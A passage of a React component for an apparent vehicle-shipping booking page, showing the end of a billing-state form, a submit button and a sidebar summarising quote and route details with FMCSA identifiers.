                          {formErrors[field.name]}
                        </p>
                      )}
                    </div>
                  ))}

                  <div className="transition-all duration-300 hover:shadow-md rounded-xl p-1 sm:p-2">
                    <label className="block text-gray-700 text-sm sm:text-base md:text-xl font-bold mb-1 sm:mb-2 flex items-center">
                      <svg
                        className="w-3 h-3 sm:w-4 sm:h-4 md:w-5 md:h-5 mr-1 sm:mr-2 text-blue-500"
                        fill="none"
                        stroke="currentColor"
                        viewBox="0 0 24 24"
                      >
                        <path
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          strokeWidth="2"
                          d="M9 20l-5.447-2.724A1 1 0 013 16.382V5.618a1 1 0 011.447-.894L9 7m0 13l6-3m-6 3V7m6 10l4.553 2.276A1 1 0 0021 18.382V7.618a1 1 0 00-.553-.894L15 4m0 13V4m0 0L9 7"
                        />
                      </svg>
                      State
                    </label>
                    <div className="relative">
                      <select
                        name="billing_state"
                        value={formData.billing_state}
                        onChange={handleInputChange}
                        className={`block appearance-none w-full bg-white border-2 ${
                          formErrors.billing_state
                            ? "border-red-500"
                            : "border-gray-300"
                        } rounded-lg sm:rounded-xl p-2 sm:p-3 md:p-4 leading-tight text-gray-600 focus:border-blue-500 focus:ring focus:ring-blue-200 focus:ring-opacity-50 text-xs sm:text-sm md:text-base`}
                      >
                        <option value="">Select a state</option>
                        {states.map((state) => (
                          <option key={state.abbr} value={state.abbr}>
                            {state.name} ({state.abbr})
                          </option>
                        ))}
                      </select>
                      <div className="pointer-events-none absolute inset-y-0 right-0 flex items-center px-2 text-gray-700">
                        <svg
                          className="fill-current h-4 w-4"
                          viewBox="0 0 20 20"
                        >
                          <path d="M9.293 12.95l.707.707L15.657 8l-1.414-1.414L10 10.828 5.757 6.586 4.343 8z" />
                        </svg>
                      </div>
                    </div>
                    {formErrors.billing_state && (
                      <p className="text-red-500 text-xs sm:text-sm">
                        {formErrors.billing_state}
                      </p>
                    )}
                  </div>
                </div>

                <div className="flex justify-center mt-3 sm:mt-4 md:mt-6">
                  <button
                    type="submit"
                    onClick={handleSubmit}
                    disabled={isSubmitting}
                    className={`flex items-center justify-center gap-1 sm:gap-2 md:gap-3 px-4 sm:px-6 md:px-8 py-2 sm:py-3 md:py-4 text-sm sm:text-base md:text-xl font-bold text-white bg-gradient-to-r from-green-500 to-green-600 border-2 border-green-700 rounded-full shadow-lg transition-all duration-300 ease-in-out transform hover:scale-105 hover:shadow-xl active:scale-95 hover:from-green-600 hover:to-green-700 ${
                      isSubmitting ? "opacity-50 cursor-not-allowed" : ""
                    }`}
                  >
                    <span>
                      {isSubmitting
                        ? "Processing..."
                        : "Schedule Your Shipping"}
                    </span>
                    <MdKeyboardDoubleArrowRight className="text-lg sm:text-xl md:text-2xl" />
                  </button>
                </div>
              </div>
            </div>
          </div>
          <div className="w-full md:w-96 lg:w-96 space-y-2">
            {/* Reservation Details */}
            <div className="md:sticky md:top-4">
              <div className="border border-gray-700 rounded-lg p-3 md:p-4">
                <h2 className="text-xl md:text-2xl text-[#535353] font-semibold mb-1 md:mb-2">
                  Reservation Details
                </h2>
                <div className="h-[8px] md:h-[10px] w-[50%] bg-[#d9d9d9] mb-1"></div>
                <div className="text-3xl md:text-4xl font-bold">
                  <span className="text-rapidcolor text-4xl md:text-6xl">
                    $
                  </span>
                  <span className="text-3xl md:text-5xl">0</span>
                  <span className="text-xl md:text-3xl font-normal text-gray-600">
                    /Due Now
                  </span>
                </div>
              </div>

              {/* Quote Overview */}
              <div className="border border-gray-700 rounded-lg flex justify-center items-center bg-red-50 p-2">
                <h2 className="text-xl md:text-2xl text-center font-semibold mb-1 md:mb-2">
                  Overview of the Quote
                </h2>
              </div>

              {/* Route Details */}
              <div className="border border-gray-700 rounded-lg p-3 md:p-4">
                <div className="flex justify-between items-center mb-3 md:mb-4">
                  <h2 className="text-xl md:text-2xl font-semibold">
                    Route details
                  </h2>
                </div>

                {loading ? (
                  <p className="text-gray-600">Loading...</p>
                ) : (
                  <>
                    {/* Quote ID */}
                    <div className="mb-3 md:mb-4">
                      <div className="flex items-center mb-1">
                        <svg
                          className="w-4 h-4 md:w-5 md:h-5 mr-2 text-gray-500"
                          fill="none"
                          stroke="currentColor"
                          viewBox="0 0 24 24"
                        >
                          <path
                            strokeLinecap="round"
                            strokeLinejoin="round"
                            strokeWidth="2"
                            d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2"
                          />
                        </svg>
                        <span className="text-gray-600 text-base md:text-lg">
                          Quote ID
                        </span>
                      </div>
                      <p className="ml-6 md:ml-7 text-sm md:text-base">
                        {quoteDetails?.quote_id || quote_id || "1234567890"}
                      </p>
                      <hr className="mt-2 border-gray-200" />
                    </div>

                    {/* From */}
                    <div className="mb-3 md:mb-4">
                      <div className="flex items-center mb-1">
                        <svg
                          className="w-4 h-4 md:w-5 md:h-5 mr-2 text-gray-500"
                          fill="none"
                          stroke="currentColor"
                          viewBox="0 0 24 24"
                        >
                          <path
                            strokeLinecap="round"
                            strokeLinejoin="round"
                            strokeWidth="2"
                            d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"
                          />
                          <path
                            strokeLinecap="round"
                            strokeLinejoin="round"
                            strokeWidth="2"
                            d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"
                          />
                        </svg>
                        <span className="text-gray-600 text-base md:text-lg">
                          From
                        </span>
                      </div>
                      <p className="ml-6 md:ml-7 text-sm md:text-base">
                        {quoteDetails?.ship_form || "Los Angeles, CA"}
                      </p>
                      <hr className="mt-2 border-gray-200" />
                    </div>

                    {/* To */}
                    <div className="mb-3 md:mb-4">
                      <div className="flex items-center mb-1">
                        <svg
                          className="w-4 h-4 md:w-5 md:h-5 mr-2 text-gray-500"
                          fill="none"
                          stroke="currentColor"
                          viewBox="0 0 24 24"
                        >
                          <path
                            strokeLinecap="round"
                            strokeLinejoin="round"
                            strokeWidth="2"
                            d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"
                          />
                          <path
                            strokeLinecap="round"
                            strokeLinejoin="round"
                            strokeWidth="2"
                            d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"
                          />
                        </svg>
                        <span className="text-gray-600 text-base md:text-lg">
                          To
                        </span>
                      </div>
                      <p className="ml-6 md:ml-7 text-sm md:text-base">
                        {quoteDetails?.ship_to || "Philadelphia, PA"}
                      </p>
                      <hr className="mt-2 border-gray-200" />
                    </div>

                    {/* First Pick up Date */}
                    <div className="mb-3 md:mb-4">
                      <div className="flex items-center mb-1">
                        <svg
                          className="w-4 h-4 md:w-5 md:h-5 mr-2 text-gray-500"
                          fill="none"
                          stroke="currentColor"
                          viewBox="0 0 24 24"
                        >
                          <path
                            strokeLinecap="round"
                            strokeLinejoin="round"
                            strokeWidth="2"
                            d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"
                          />
                        </svg>
                        <span className="text-gray-600 text-base md:text-lg">
                          First Pick up Date
                        </span>
                      </div>
                      <p className="ml-6 md:ml-7 text-sm md:text-base">
                        {quoteDetails?.pickup_date || "1 May"}
                      </p>
                      <hr className="mt-2 border-gray-200" />
                    </div>

                    {/* Vehicle */}
                    <div className="mb-3 md:mb-4">
                      <div className="flex items-center mb-1">
                        <svg
                          className="w-4 h-4 md:w-5 md:h-5 mr-2 text-gray-500"
                          fill="none"
                          stroke="currentColor"
                          viewBox="0 0 24 24"
                        >
                          <path
                            fill="none"
                            d="M1.5 13.5h21v3h-21zm2-8h17v2h-17z"
                          ></path>
                          <path
                            strokeLinecap="round"
                            strokeLinejoin="round"
                            strokeWidth="2"
                            d="M7 10.5H4.5v2h-3v7h3v2h15v-2h3v-7h-3v-2H17"
                          ></path>
                          <circle cx="7.5" cy="16.5" r="1.5" />
                          <circle cx="16.5" cy="16.5" r="1.5" />
                        </svg>
                        <span className="text-gray-600 text-base md:text-lg">
                          Vehicle
                        </span>
                      </div>
                      <p className="ml-6 md:ml-7 text-sm md:text-base truncate">
                        {quoteDetails
                          ? `${quoteDetails.year} ${quoteDetails.make} ${quoteDetails.model}`
                          : "Mercedes 2000 C class"}
                      </p>

                      <hr className="mt-2 border-gray-200" />
                    </div>

                    {/* Transit Time */}
                    <div className="mb-3 md:mb-4">
                      <div className="flex items-center mb-1">
                        <svg
                          className="w-4 h-4 md:w-5 md:h-5 mr-2 text-gray-500"
                          fill="none"
                          stroke="currentColor"
                          viewBox="0 0 24 24"
                        >
                          <path
                            strokeLinecap="round"
                            strokeLinejoin="round"
                            strokeWidth="2"
                            d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"
                          />
                        </svg>
                        <span className="text-gray-600 text-base md:text-lg">
                          Transit Time
                        </span>
                      </div>
                      <p className="ml-6 md:ml-7 text-sm md:text-base">
                        {calculateTransitTime(quoteDetails?.distance)}
                      </p>
                      <hr className="mt-2 border-gray-200" />
                    </div>

                    {/* Transport Type */}
                    <div className="mb-3 md:mb-4">
                      <div className="flex items-center mb-1">
                        <svg
                          className="w-4 h-4 md:w-5 md:h-5 mr-2 text-gray-500"
                          fill="none"
                          stroke="currentColor"
                          viewBox="0 0 24 24"
                        >
                          <path
                            strokeLinecap="round"
                            strokeLinejoin="round"
                            strokeWidth="2"
                            d="M4 6h16M4 10h16M4 14h16M4 18h16"
                          />
                        </svg>
                        <span className="text-gray-600 text-base md:text-lg">
                          Transport Type
                        </span>
                      </div>
                      <p className="ml-6 md:ml-7 text-sm md:text-base">
                        {quoteDetails?.transport_method || "Open"}
                      </p>
                      <hr className="mt-2 border-gray-200" />
                    </div>

                    {/* Vehicle Condition */}
                    <div className="mb-3 md:mb-4">
                      <div className="flex items-center mb-1">
                        <svg
                          className="w-4 h-4 md:w-5 md:h-5 mr-2 text-gray-500"
                          fill="none"
                          stroke="currentColor"
                          viewBox="0 0 24 24"
                        >
                          <path
                            strokeLinecap="round"
                            strokeLinejoin="round"
                            strokeWidth="2"
                            d="M4 6h16M4 10h16M4 14h16M4 18h16"
                          />
                        </svg>
                        <span className="text-gray-600 text-base md:text-lg">
                          Vehicle Condition
                        </span>
                      </div>
                      <p className="ml-6 md:ml-7 text-sm md:text-base">
                        {quoteDetails?.vehicle_type || "Running"}
                      </p>
                      <hr className="mt-2 border-gray-200" />
                    </div>

                    {/* Price (if available) */}
                    {quoteDetails?.price && (
                      <div className="mb-3 md:mb-4">
                        <div className="flex items-center mb-1">
                          <svg
                            className="w-4 h-4 md:w-5 md:h-5 mr-2 text-gray-500"
                            fill="none"
                            stroke="currentColor"
                            viewBox="0 0 24 24"
                          >
                            <path
                              strokeLinecap="round"
                              strokeLinejoin="round"
                              strokeWidth="2"
                              d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
                            />
                          </svg>
                          <span className="text-gray-600 text-base md:text-lg">
                            Price
                          </span>
                        </div>
                        <p className="ml-6 md:ml-7 text-sm md:text-base">
                          ${quoteDetails.price + quoteDetails?.insurance_price}
                        </p>
                        <hr className="mt-2 border-gray-200" />
                      </div>
                    )}

                    {/* FMCSA Information */}
                    <div className="flex items-center mt-4 md:mt-6">
                      <div className="w-14 h-14 md:w-20 md:h-20 mr-2">
                        <img
                          src="/images/US_DOT_Triskelion.png"
                          className="w-full h-full"
                        />
                      </div>
                      <div className="text-[#003e7e] font-bold text-sm md:text-base">
                        <p>FMCSA</p>
                        <p>MC #: 1685548</p>
                        <p>U.S.DOT #: 4320359</p>
                      </div>
                    </div>
                  </>
                )}
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
